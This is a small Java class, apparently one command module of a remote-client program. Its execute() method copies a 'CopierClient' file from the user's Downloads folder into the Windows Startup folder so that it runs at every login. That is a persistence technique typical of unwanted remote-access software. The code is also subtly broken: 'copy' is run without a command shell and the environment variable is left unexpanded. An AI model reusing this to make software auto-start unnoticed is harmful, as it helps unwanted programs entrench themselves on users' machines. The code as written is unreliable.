package commands;

import java.io.IOException;

public class SetStartupCommand implements Command {

	@Override
	public String execute() {
		String[] CMD={"copy", "%userprofile%/Downloads/CopierClient", "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"};
		try {
			Runtime.getRuntime().exec(CMD);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
